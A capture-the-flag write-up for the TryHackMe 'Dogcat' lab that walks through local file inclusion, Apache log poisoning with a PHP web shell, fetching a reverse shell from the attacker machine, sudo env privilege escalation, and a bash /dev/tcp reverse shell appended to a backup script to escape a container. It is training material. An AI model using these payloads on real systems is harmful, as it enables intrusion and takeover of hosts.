[Home](../../index.md)

# TryHackMe: Dogcat

https://tryhackme.com/room/dogcat

The initial nmap scan reveals nothing unusual.  A web server and SSH:
```
┌──(kali㉿kali)-[~/tryhackme/dogcat]
└─$ rustscan -a 10.10.113.229 -r 1-65535 -- -sV

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

A directory search reveals a directory for both dogs and cats.  Unfortunately we cannot access the directories directly, we get a 403.
```
┌──(kali㉿kali)-[~/tryhackme/dogcat]
└─$ sudo feroxbuster -u http://10.10.113.229 -w /usr/share/wordlists/dirb/big.txt 

301        9l       28w      313c http://10.10.113.229/cats
301        9l       28w      313c http://10.10.113.229/dogs
403        9l       28w      278c http://10.10.113.229/server-status
```

The website itself is just a page with two buttons, to see a dog or a cat.  The buttons add a parameter to the URL.  There is no javascript, so this is probably utilizing some PHP code to load files from the /cats and /dogs directories.
```
<a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
```

Manually setting the parameter to something else results in the message "Sorry, only dogs or cats are allowed."

---
## Flag 1

Knowing PHP is involved, we re-run feroxbuster with the php extension and found matching files, when browsing directly to them they display a random cat or dog image.
```
┌──(kali㉿kali)-[~/tryhackme/dogcat]
└─$ sudo feroxbuster -u http://10.10.113.229 -w /usr/share/wordlists/dirb/big.txt -x php
```

This also revealed a flag.php file.  Browsing directly shows us nothing. Trying the ?view=flag parameter still gets stopped by the PHP logic.

We can use PHP filters to get the code from flag.php encoded in base64.

`http://10.10.113.229/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag`

This reveals flag 1 when decoded.

---
## Flag 2

We can similarly get the index.php code with the same method.

`http://10.10.113.229/?view=php://filter/read=convert.base64-encode/resource=./dog/../index`

```
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

Reading through this code we can see two key items.

1. Our parameter needs to have the string 'dog' or 'cat' in it.
2. We can use the additional parameter 'ext' to control the extension (or lack thereof)

This can be confirmed by displaying /etc/passwd

`http://10.10.113.229/?view=./dog/../../../../etc/passwd&ext`

Since this server is running Apache with PHP and we can load other files from the server in our browser, it is likely that we can perform log poisoning and run our own PHP code.

Here we can verify we have access to the log:

`http://10.10.113.229/?view=./dog/../../../../var/log/apache2/access.log&ext`

Our PHP script we are injecting via headers and a curl command (had to escape the $, was getting a strange error):

```
curl -H "User-Agent: <?php system(\$_GET['cmd']);?>" http://10.10.113.229
```

Verify with this (and search for www-data)

`http://10.10.113.229/?view=./dog/../../../../var/log/apache2/access.log&ext&cmd=whoami`

Grabbed a php reverse shell from https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Changed the IP to attacker

Used python http server and our poisoned log to upload:

```
┌──(kali㉿kali)-[~/tryhackme/dogcat]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Browse or Curl:
`http://10.10.113.229/?view=./dog/../../../../var/log/apache2/access.log&ext&cmd=curl%20-o%20shell.php%20http://10.13.18.7:8000/php-reverse-shell.php`
```
┌──(kali㉿kali)-[~/tryhackme/dogcat]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```
Browse or Curl:
`http://10.10.113.229/shell.php`
```
┌──(kali㉿kali)-[~/tryhackme/dogcat]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.13.18.7] from (UNKNOWN) [10.10.113.229] 49918
Linux 7d96d51ea451 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 03:25:12 up  1:54,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
browsing to /var/www reveals the 2nd flag

---
## Flag 3

Checking sudo permissions shows an easily exploitable binary https://gtfobins.github.io/gtfobins/env/#sudo
```
$ sudo -l
Matching Defaults entries for www-data on 7d96d51ea451:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 7d96d51ea451:
    (root) NOPASSWD: /usr/bin/env
```

This gets us root access, and Flag 3 is in /root


---
## Flag 4

The room mentioned breaking out of a container, so that's what we have to do to get the last flag.

There is a backup script in /opt/backups that is run on the parent box.  By altering this script we can get another reverse shell to the parent.

```
cd /opt/backups
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.13.18.7/4444 0>&1'" >> backup.sh
```

Catch it and get the flag

```
┌──(kali㉿kali)-[~/tryhackme/dogcat]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.13.18.7] from (UNKNOWN) [10.10.113.229] 43432
bash: cannot set terminal process group (8055): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dogcat:~# pwd
pwd
/root
root@dogcat:~# ls
ls
container
flag4.txt
```

